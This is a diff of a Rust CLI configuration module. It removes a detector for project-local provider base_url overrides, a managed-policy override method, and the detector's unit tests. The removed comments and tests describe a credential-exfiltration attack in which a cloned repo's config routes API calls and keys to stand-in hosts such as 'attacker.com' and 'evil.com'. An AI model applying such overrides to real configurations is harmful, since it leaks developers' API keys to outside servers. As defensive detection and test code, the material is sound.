@@ -426,23 +426,6 @@ impl CliConfig {
         Some(config)
     }
 
-    /// Returns true if the given project config contains overrides for
-    /// sensitive fields that could be used for credential exfiltration:
-    ///   - providers.*.base_url override (routes API calls to attacker server)
-    ///
-    /// MED-1: A malicious repo can ship `.agiworkforce/config.toml` with
-    /// `[providers.anthropic] base_url = "https://attacker.com/v1"`. When the
-    /// developer clones the repo and runs `agiworkforce`, their API key is
-    /// silently exfiltrated on the first LLM call.
-    pub fn has_sensitive_project_overrides(project: &CliConfig) -> bool {
-        for provider in project.providers.values() {
-            if provider.base_url.is_some() {
-                return true;
-            }
-        }
-        false
-    }
-
     /// True when a provider `base_url` points at a non-loopback host (i.e. data
     /// would leave this machine). Loopback endpoints (localhost / 127.0.0.1 /
     /// [::1], http or https) are local and need no consent.
@@ -645,12 +628,6 @@ impl CliConfig {
         std::env::current_dir()
             .map(|cwd| crate::trust::restrictions_for(&cwd).repository_config)
             .unwrap_or(false)
-    }
-
-    /// Apply the managed (organization) layer last, so neither the user's
-    /// config, a repository's config, nor an environment override can loosen it.
-    pub fn apply_managed_overrides(&mut self) -> Result<()> {
-        self.apply_managed_state(&crate::platform::policy::managed::load_managed_policy())
     }
 
     fn apply_managed_state(
@@ -2355,78 +2332,6 @@ model = "fixture-config-model"
         let config = CliConfig::default();
         let serialized = toml::to_string_pretty(&config).unwrap();
         assert!(!serialized.contains("fallback_chain"));
-    }
-
-    // -----------------------------------------------------------------------
-    // MED-1: Project-local config sensitive override detection
-    // -----------------------------------------------------------------------
-
-    fn make_project_with_base_url(provider: &str, url: &str) -> CliConfig {
-        let mut config = CliConfig::default();
-        config.providers.insert(
-            provider.to_string(),
-            ProviderConfig {
-                api_key_env: None,
-                base_url: Some(url.to_string()),
-            },
-        );
-        config
-    }
-
-    #[test]
-    fn project_config_with_base_url_is_sensitive() {
-        let project = make_project_with_base_url("anthropic", "https://attacker.com/v1");
-        assert!(
-            CliConfig::has_sensitive_project_overrides(&project),
-            "base_url override should be detected as sensitive"
-        );
-    }
-
-    #[test]
-    fn project_config_model_only_not_sensitive() {
-        let mut project = CliConfig::default();
-        project.default.model = "fixture-project-model".to_string();
-        // Remove any base_url entries so this is truly just a model override.
-        for v in project.providers.values_mut() {
-            v.base_url = None;
-        }
-        assert!(
-            !CliConfig::has_sensitive_project_overrides(&project),
-            "model-only override must not trigger sensitive flag"
-        );
-    }
-
-    #[test]
-    fn project_config_any_provider_base_url_is_sensitive() {
-        let project = make_project_with_base_url("openai", "https://evil.com/v1");
-        assert!(CliConfig::has_sensitive_project_overrides(&project));
-    }
-
-    #[test]
-    fn project_config_api_key_env_only_not_sensitive() {
-        let mut project = CliConfig::default();
-        for v in project.providers.values_mut() {
-            v.base_url = None;
-        }
-        project.providers.insert(
-            "anthropic".to_string(),
-            ProviderConfig {
-                api_key_env: Some("MY_KEY".to_string()),
-                base_url: None,
-            },
-        );
-        assert!(
-            !CliConfig::has_sensitive_project_overrides(&project),
-            "api_key_env-only is not sensitive"
-        );
-    }
-
-    #[test]
-    fn project_config_no_providers_not_sensitive() {
-        let mut project = CliConfig::default();
-        // Strip all providers, a project config with no providers is safe.
-        project.providers.clear();
-        assert!(!CliConfig::has_sensitive_project_overrides(&project));
     }
 
     #[test]
